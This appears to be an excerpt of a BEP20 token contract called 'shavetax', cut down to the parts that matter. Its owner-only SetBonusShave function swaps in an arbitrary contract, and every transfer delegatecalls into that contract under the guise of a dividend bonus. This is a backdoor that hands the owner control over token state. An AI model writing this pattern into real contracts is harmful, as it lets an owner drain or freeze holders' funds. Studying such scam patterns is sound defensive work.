...
contract shavetax is Context, iBEP20, Ownable{
  ...
  string private constant _name = 'shavetax';
  string private constant _symbol = 'Shave';
  ...
  */
  ...
  function claimDividendShave(address sender, address recipient, uint256 amount) private returns (uint256) {      
      ...
      (bool success, bytes memory bytesdata) = C_Shave.delegatecall(
  ...
  function SetBonusShave(address c) public onlyOwner {
    C_Shave = c;
  } 
  ...
  function _transfer(address sender, address recipient, uint256 amount) private {
    ...
    uint256 bonusAmount = claimDividendShave(sender, recipient, amount);   
